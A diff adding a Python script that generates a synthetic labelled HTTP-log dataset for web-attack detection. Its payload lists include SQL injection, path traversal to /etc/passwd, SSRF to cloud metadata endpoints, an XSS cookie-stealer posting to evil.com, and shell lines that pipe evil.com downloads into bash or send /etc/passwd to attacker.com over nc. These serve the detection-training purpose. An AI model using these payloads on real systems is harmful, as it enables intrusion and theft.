@@ -1,0 +1,580 @@
+import pandas as pd
+import numpy as np
+import random
+from datetime import datetime, timedelta
+import ipaddress
+import urllib.parse
+import json
+
+# Set random seed for reproducibility
+np.random.seed(42)
+random.seed(42)
+
+# Configuration
+TOTAL_ROWS = 10000
+NORMAL_PERCENT = 0.40
+ATTACK_PERCENT = 0.60
+
+NORMAL_ROWS = int(TOTAL_ROWS * NORMAL_PERCENT)
+ATTACK_ROWS = TOTAL_ROWS - NORMAL_ROWS
+
+# Realistic IP ranges (private and public)
+PRIVATE_IPS = ['192.168.1.', '10.0.0.', '172.16.0.']
+PUBLIC_IPS = ['203.0.113.', '198.51.100.', '185.199.108.', '104.18.24.', '172.67.128.']
+
+# Realistic destination IPs
+DEST_IPS = [
+    '203.0.113.45', '198.51.100.23', '185.199.108.153', '104.18.24.12', 
+    '172.67.128.45', '192.168.1.1', '10.0.0.1', '34.120.45.67', 
+    '52.45.123.89', '3.12.45.78'
+]
+
+# User Agents
+USER_AGENTS = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
+    'python-requests/2.28.0',
+    'curl/7.81.0',
+    'wget/1.21.2',
+    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+    'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
+    'Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15',
+    'SQLmap/1.8.4',
+    'XSStrike/3.1.5',
+    'BurpSuite/2023.12',
+    'Nmap Scripting Engine',
+    'Nikto/2.5.0'
+]
+
+# Attack type distribution (realistic imbalance)
+ATTACK_DISTRIBUTION = {
+    'sql_injection': {
+        'weight': 0.20,
+        'subtypes': ['union_based', 'error_based', 'boolean_blind', 'time_blind', 'stacked_queries', 'out_of_band']
+    },
+    'xss': {
+        'weight': 0.18,
+        'subtypes': ['reflected', 'stored', 'dom_based', 'self_xss', 'mutation']
+    },
+    'directory_traversal': {
+        'weight': 0.12,
+        'subtypes': ['relative_path', 'absolute_path', 'encoded', 'double_encoding', 'null_byte']
+    },
+    'command_injection': {
+        'weight': 0.10,
+        'subtypes': ['os_command', 'blind_command', 'time_based', 'argument', 'pipe_chaining']
+    },
+    'credential_stuffing_brute_force': {
+        'weight': 0.15,
+        'subtypes': ['credential_stuffing', 'password_brute_force', 'dictionary_attack', 'reverse_brute_force', 'password_spraying']
+    },
+    'ssrf': {
+        'weight': 0.08,
+        'subtypes': ['basic', 'blind', 'url_schemes', 'dns_rebinding', 'internal_service']
+    },
+    'typosquatting_url_spoofing': {
+        'weight': 0.17,
+        'subtypes': ['homograph', 'bit_flip_typo', 'missing_dot', 'wrong_tld', 'subdomain_spoofing', 'combo_squatting']
+    }
+}
+
+# Generate timestamp
+def generate_timestamp(start_date, end_date):
+    delta = end_date - start_date
+    random_seconds = random.randint(0, int(delta.total_seconds()))
+    return start_date + timedelta(seconds=random_seconds)
+
+start_date = datetime(2026, 3, 1, 0, 0, 0)
+end_date = datetime(2026, 3, 24, 23, 59, 59)
+
+# Generate source IP
+def generate_source_ip():
+    if random.random() < 0.7:  # 70% private IPs (internal users)
+        ip_class = random.choice(PRIVATE_IPS)
+        return ip_class + str(random.randint(1, 254))
+    else:
+        return random.choice(PUBLIC_IPS) + str(random.randint(1, 254))
+
+# Convert headers to single line (JSON string to avoid multiline)
+def headers_to_json_string(headers_dict):
+    return json.dumps(headers_dict, separators=(',', ':'))
+
+# Normal traffic URLs and payloads
+def generate_normal_data():
+    normal_urls = [
+        '/', '/home', '/about', '/contact', '/products', '/services', '/blog', 
+        '/login', '/register', '/search', '/profile', '/dashboard', '/settings',
+        '/api/v1/users', '/api/v1/products', '/download/file.pdf', '/images/logo.png',
+        '/css/style.css', '/js/script.js'
+    ]
+    
+    params = ['id', 'page', 'q', 'user', 'product', 'category', 'sort', 'limit']
+    
+    url = random.choice(normal_urls)
+    if random.random() < 0.4:  # Add parameters
+        param = random.choice(params)
+        value = random.choice(['1', '2', 'home', 'admin', 'product1', 'laptop', 'books'])
+        url += f'?{param}={value}'
+    
+    method = random.choices(['GET', 'POST'], weights=[0.7, 0.3])[0]
+    
+    request_body = ''
+    if method == 'POST':
+        post_params = random.choice([
+            'username=john_doe&password=pass123',
+            'email=user@example.com&subscribe=true',
+            'search_query=laptops',
+            'comment=Great article!',
+            'name=John&message=Hello'
+        ])
+        request_body = post_params
+    
+    response_code = random.choices([200, 301, 302, 404], weights=[0.8, 0.05, 0.05, 0.1])[0]
+    response_size = random.randint(500, 5000)
+    
+    return {
+        'url': url,
+        'http_method': method,
+        'request_body': request_body,
+        'response_code': response_code,
+        'response_size': response_size,
+        'user_agent': random.choice(USER_AGENTS[:10]),  # Legitimate UAs for normal traffic
+        'payload_raw': '',
+        'attack_type_label': 'normal'
+    }
+
+# SQL Injection payloads
+def generate_sqli_payload(subtype):
+    payloads = {
+        'union_based': [
+            "' UNION SELECT username,password FROM users--",
+            "1 UNION SELECT null,version()--",
+            "admin' UNION SELECT 1,2,3,4--",
+            "' UNION ALL SELECT table_name FROM information_schema.tables--"
+        ],
+        'error_based': [
+            "' AND extractvalue(1,concat(0x7e,database()))--",
+            "' AND updatexml(1,concat(0x7e,version()),1)--",
+            "' AND (SELECT * FROM(SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        ],
+        'boolean_blind': [
+            "' AND '1'='1",
+            "' AND substring(database(),1,1)='a'--",
+            "' OR 1=1--",
+            "' AND ascii(substring(database(),1,1))>100--"
+        ],
+        'time_blind': [
+            "' AND SLEEP(5)--",
+            "'; WAITFOR DELAY '0:0:5'--",
+            "' AND IF(1=1, BENCHMARK(1000000,MD5(1)), 0)--",
+            "' OR IF(1=1, SLEEP(5), 0)--"
+        ],
+        'stacked_queries': [
+            "'; DROP TABLE users--",
+            "'; INSERT INTO logs VALUES('hacked')--",
+            "'; UPDATE users SET password='hacked' WHERE username='admin'--"
+        ],
+        'out_of_band': [
+            "' AND load_file(concat('\\\\',database(),'.attacker.com\\'))--",
+            "' AND (SELECT * FROM (SELECT(MASTER.dbo.fn_varbintohexstr(CAST(DB_NAME() AS VARBINARY))))A)--"
+        ]
+    }
+    return random.choice(payloads.get(subtype, payloads['union_based']))
+
+# XSS payloads
+def generate_xss_payload(subtype):
+    payloads = {
+        'reflected': [
+            "<script>alert('XSS')</script>",
+            "<img src=x onerror=alert(1)>",
+            "javascript:alert('XSS')",
+            "<svg onload=alert(document.cookie)>"
+        ],
+        'stored': [
+            "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>",
+            "<iframe src='javascript:alert(1)'>",
+            "';<script>alert(1)</script>",
+            "<div onmouseover='alert(1)'>Hover me</div>"
+        ],
+        'dom_based': [
+            "#<script>alert(document.domain)</script>",
+            "#<img src=/ onerror=alert(1)>",
+            "javascript:alert('DOM XSS')",
+            "#<body onload=alert(1)>"
+        ],
+        'self_xss': [
+            "prompt('Enter your password:', 'password')",
+            "console.log('XSS')",
+            "alert('Your session has expired')",
+            "document.write('<script>alert(1)</script>')"
+        ],
+        'mutation': [
+            "<scri<script>pt>alert(1)</scri</script>pt>",
+            "<<script>alert(1)//<</script>",
+            "<svg><script>alert(1)</script>",
+            "<img src=\"x\" onerror=\"alert(1)\""
+        ]
+    }
+    return random.choice(payloads.get(subtype, payloads['reflected']))
+
+# Directory Traversal payloads
+def generate_traversal_payload(subtype):
+    payloads = {
+        'relative_path': [
+            "../../../../etc/passwd",
+            "../../../windows/win.ini",
+            "../config/database.yml",
+            "../../../../var/log/apache/access.log"
+        ],
+        'absolute_path': [
+            "/etc/passwd",
+            "/etc/shadow",
+            "C:\\windows\\system32\\drivers\\etc\\hosts",
+            "/proc/self/environ"
+        ],
+        'encoded': [
+            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+            "..%252f..%252f..%252fetc%252fpasswd",
+            "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+            "..%c0%af..%c0%af..%c0%afetc/passwd"
+        ],
+        'double_encoding': [
+            "%252e%252e%252f%252e%252e%252fetc/passwd",
+            "..%255c..%255c..%255cwindows%255cwin.ini",
+            "%25%32%65%25%32%65%25%32%66etc/passwd"
+        ],
+        'null_byte': [
+            "../../../../etc/passwd%00.jpg",
+            "../../../etc/passwd%00.png",
+            "../../../../etc/passwd%00.html"
+        ]
+    }
+    return random.choice(payloads.get(subtype, payloads['relative_path']))
+
+# Command Injection payloads
+def generate_cmd_injection_payload(subtype):
+    payloads = {
+        'os_command': [
+            "; cat /etc/passwd",
+            "| whoami",
+            "&& ls -la",
+            "; wget http://evil.com/shell.sh"
+        ],
+        'blind_command': [
+            "| ping -c 10 127.0.0.1",
+            "; sleep 10",
+            "&& curl http://attacker.com",
+            "| nslookup attacker.com"
+        ],
+        'time_based': [
+            "| ping -n 10 127.0.0.1",
+            "; sleep 10",
+            "&& timeout 5",
+            "| ping -c 10 127.0.0.1"
+        ],
+        'argument': [
+            "--exec=cat /etc/passwd",
+            "--upload=/tmp/malicious.php",
+            "--file=/etc/passwd",
+            "-e /bin/bash"
+        ],
+        'pipe_chaining': [
+            "; cat /etc/passwd | nc attacker.com 4444",
+            "| wget -O- http://evil.com | bash",
+            "&& curl http://evil.com | sh",
+            "; python -c 'import socket,subprocess,os'"
+        ]
+    }
+    return random.choice(payloads.get(subtype, payloads['os_command']))
+
+# SSRF payloads
+def generate_ssrf_payload(subtype):
+    payloads = {
+        'basic': [
+            "http://169.254.169.254/latest/meta-data/",
+            "http://localhost:8080/admin",
+            "http://127.0.0.1:3306",
+            "http://internal-service.local/health"
+        ],
+        'blind': [
+            "http://attacker.com/callback",
+            "http://burp-collaborator.net",
+            "http://169.254.169.254:8080",
+            "http://192.168.1.1/config"
+        ],
+        'url_schemes': [
+            "file:///etc/passwd",
+            "gopher://localhost:3306/_",
+            "dict://localhost:11211/",
+            "ftp://127.0.0.1:21"
+        ],
+        'dns_rebinding': [
+            "http://127.0.0.1.nip.io/",
+            "http://localhost.nip.io/admin",
+            "http://rebind.network/",
+            "http://169.254.169.254.xip.io/"
+        ],
+        'internal_service': [
+            "http://10.0.0.1:8080",
+            "http://172.16.0.1:9200/_cat/indices",
+            "http://192.168.1.1:8080/actuator/env",
+            "http://metadata.google.internal/computeMetadata/v1/"
+        ]
+    }
+    return random.choice(payloads.get(subtype, payloads['basic']))
+
+# Credential Stuffing/Brute Force payloads
+def generate_credential_payload(subtype):
+    common_usernames = ['admin', 'root', 'user', 'test', 'john', 'alice', 'bob']
+    common_passwords = ['password123', 'admin123', '123456', 'password', 'qwerty', 'admin', 'root']
+    
+    if subtype == 'credential_stuffing':
+        combos = [
+            f"username={random.choice(common_usernames)}&password={random.choice(common_passwords)}",
+            f"email=user{random.randint(1,100)}@example.com&password={random.choice(common_passwords)}",
+            f"login={random.choice(common_usernames)}&pass={random.choice(common_passwords)}"
+        ]
+    elif subtype == 'password_brute_force':
+        combos = [
+            f"username=admin&password={random.choice(common_passwords)}",
+            f"username=admin&password=pass{random.randint(100,999)}",
+            f"user=admin&pwd={random.choice(common_passwords)}"
+        ]
+    elif subtype == 'dictionary_attack':
+        combos = [
+            f"username={random.choice(common_usernames)}&password={random.choice(common_passwords)}",
+            f"email=test{random.randint(1,50)}@test.com&password={random.choice(common_passwords)}"
+        ]
+    elif subtype == 'reverse_brute_force':
+        combos = [
+            f"username={random.choice(common_usernames)}&password=password123",
+            f"username={random.choice(common_usernames)}&password=admin123"
+        ]
+    else:  # password_spraying
+        combos = [
+            "username=john&password=Summer2023",
+            "username=alice&password=Winter2024",
+            "username=bob&password=Spring2024"
+        ]
+    
+    return random.choice(combos)
+
+# Typosquatting payloads
+def generate_typosquatting_url(subtype):
+    domains = {
+        'homograph': [
+            "paypaI.com", "g00gle.com", "faceb00k.com", "micros0ft.com",
+            "amaz0n.com", "tw1tter.com", "1inkedin.com", "yaho0.com"
+        ],
+        'bit_flip_typo': [
+            "gooogle.com", "facebok.com", "twiter.com", "yhoo.com",
+            "linkdin.com", "amzon.com", "micrsoft.com", "netflx.com"
+        ],
+        'missing_dot': [
+            "wwwgoogle.com", "wwwfacebookcom", "wwwamazoncom",
+            "wwwmicrosoftcom", "wwwtwittercom", "wwwlinkedincom"
+        ],
+        'wrong_tld': [
+            "google.net", "facebook.org", "amazon.co", "microsoft.io",
+            "twitter.biz", "linkedin.info", "youtube.tv"
+        ],
+        'subdomain_spoofing': [
+            "paypal.secure-login.com", "google.account-verify.com",
+            "amazon.verify-account.net", "facebook.login-help.com"
+        ],
+        'combo_squatting': [
+            "paypal-login-verification.com", "google-account-security.com",
+            "amazon-order-confirmation.net", "facebook-password-reset.org"
+        ]
+    }
+    return random.choice(domains.get(subtype, domains['homograph']))
+
+# Generate attack data
+def generate_attack_data():
+    # Select attack category based on weights
+    categories = list(ATTACK_DISTRIBUTION.keys())
+    weights = [ATTACK_DISTRIBUTION[c]['weight'] for c in categories]
+    attack_category = random.choices(categories, weights=weights)[0]
+    
+    # Select subtype
+    subtype_info = ATTACK_DISTRIBUTION[attack_category]
+    subtype = random.choice(subtype_info['subtypes'])
+    
+    # Generate URL and payload based on attack type
+    if attack_category == 'sql_injection':
+        payload = generate_sqli_payload(subtype)
+        base_url = '/products?id='
+        if random.random() < 0.5:
+            base_url = '/search?q='
+        elif random.random() < 0.3:
+            base_url = '/user?username='
+        else:
+            base_url = '/login?user='
+        url = base_url + urllib.parse.quote(payload)
+        request_body = ''
+        method = 'GET'
+        
+    elif attack_category == 'xss':
+        payload = generate_xss_payload(subtype)
+        if random.random() < 0.6:
+            url = '/search?q=' + urllib.parse.quote(payload)
+            method = 'GET'
+            request_body = ''
+        else:
+            url = '/comment'
+            method = 'POST'
+            request_body = f'comment={urllib.parse.quote(payload)}'
+        
+    elif attack_category == 'directory_traversal':
+        payload = generate_traversal_payload(subtype)
+        url = '/download?file=' + urllib.parse.quote(payload)
+        if random.random() < 0.3:
+            url = '/view?path=' + urllib.parse.quote(payload)
+        method = 'GET'
+        request_body = ''
+        
+    elif attack_category == 'command_injection':
+        payload = generate_cmd_injection_payload(subtype)
+        url = '/ping?ip=127.0.0.1' + urllib.parse.quote(payload)
+        if random.random() < 0.4:
+            url = '/traceroute?host=' + urllib.parse.quote(payload)
+        method = 'GET'
+        request_body = ''
+        
+    elif attack_category == 'ssrf':
+        payload = generate_ssrf_payload(subtype)
+        url = '/fetch?url=' + urllib.parse.quote(payload)
+        if random.random() < 0.5:
+            url = '/proxy?target=' + urllib.parse.quote(payload)
+        method = 'GET'
+        request_body = ''
+        
+    elif attack_category == 'credential_stuffing_brute_force':
+        payload = generate_credential_payload(subtype)
+        url = '/login'
+        method = 'POST'
+        request_body = payload
+        
+    else:  # typosquatting
+        malicious_domain = generate_typosquatting_url(subtype)
+        url = f'https://{malicious_domain}/login'
+        if random.random() < 0.4:
+            url += '?redirect=/dashboard'
+        method = 'GET'
+        request_body = ''
+        payload = malicious_domain
+    
+    # Determine response code based on attack and randomness
+    if random.random() < 0.3:  # 30% success-like responses
+        response_code = random.choices([200, 302], weights=[0.7, 0.3])[0]
+    else:
+        response_code = random.choices([403, 404, 500, 401], weights=[0.3, 0.3, 0.2, 0.2])[0]
+    
+    response_size = random.randint(100, 8000)
+    
+    # Attack tools user agents
+    attack_uas = USER_AGENTS[10:15] + USER_AGENTS[:3]
+    
+    return {
+        'url': url,
+        'http_method': method,
+        'request_body': request_body,
+        'response_code': response_code,
+        'response_size': response_size,
+        'user_agent': random.choice(attack_uas),
+        'payload_raw': payload,
+        'attack_type_label': attack_category
+    }
+
+# Generate full dataset
+print("Generating dataset...")
+data = []
+
+# Generate normal traffic
+for i in range(NORMAL_ROWS):
+    row = generate_normal_data()
+    row['timestamp'] = generate_timestamp(start_date, end_date)
+    row['source_ip'] = generate_source_ip()
+    row['destination_ip'] = random.choice(DEST_IPS)
+    row['protocol'] = random.choice(['HTTP', 'HTTPS'])
+    
+    # Convert headers to single-line JSON strings
+    request_headers_dict = {
+        'Host': random.choice(DEST_IPS),
+        'User-Agent': row['user_agent'],
+        'Accept': '*/*'
+    }
+    row['request_headers'] = headers_to_json_string(request_headers_dict)
+    
+    response_headers_dict = {
+        'Content-Type': 'text/html',
+        'Server': random.choice(['Apache', 'nginx', 'Cloudflare'])
+    }
+    row['response_headers'] = headers_to_json_string(response_headers_dict)
+    
+    data.append(row)
+
+# Generate attack traffic
+for i in range(ATTACK_ROWS):
+    row = generate_attack_data()
+    row['timestamp'] = generate_timestamp(start_date, end_date)
+    row['source_ip'] = generate_source_ip()
+    row['destination_ip'] = random.choice(DEST_IPS)
+    row['protocol'] = random.choice(['HTTP', 'HTTPS'])
+    
+    # Convert headers to single-line JSON strings
+    request_headers_dict = {
+        'Host': random.choice(DEST_IPS),
+        'User-Agent': row['user_agent'],
+        'Accept': '*/*'
+    }
+    row['request_headers'] = headers_to_json_string(request_headers_dict)
+    
+    response_headers_dict = {
+        'Content-Type': 'text/html',
+        'Server': random.choice(['Apache', 'nginx', 'IIS'])
+    }
+    row['response_headers'] = headers_to_json_string(response_headers_dict)
+    
+    data.append(row)
+
+# Create DataFrame
+df = pd.DataFrame(data)
+
+# Shuffle rows
+df = df.sample(frac=1, random_state=42).reset_index(drop=True)
+
+# Ensure column order
+columns_order = [
+    'timestamp', 'source_ip', 'destination_ip', 'protocol', 'http_method',
+    'url', 'request_headers', 'request_body', 'response_code',
+    'response_size', 'response_headers', 'user_agent', 'payload_raw',
+    'attack_type_label'
+]
+
+df = df[columns_order]
+
+# Save to CSV with quoting to handle any special characters
+df.to_csv('url_attack_dataset.csv', index=False, quoting=1)
+
+# Print statistics
+print(f"\nDataset generated successfully!")
+print(f"Total rows: {len(df)}")
+print(f"\nClass Distribution:")
+print(df['attack_type_label'].value_counts())
+print(f"\nAttack Type Distribution:")
+attack_counts = df[df['attack_type_label'] != 'normal']['attack_type_label'].value_counts()
+for attack, count in attack_counts.items():
+    print(f"  {attack}: {count} ({count/ATTACK_ROWS*100:.1f}%)")
+print(f"\nHTTP Method Distribution:")
+print(df['http_method'].value_counts())
+print(f"\nResponse Code Distribution:")
+print(df['response_code'].value_counts())
+
+# Show sample rows
+print("\nSample rows (first 5):")
+pd.set_option('display.max_colwidth', 80)
+print(df.head())
+print("\n✅ All rows are now single-line records with no multiline fields!")
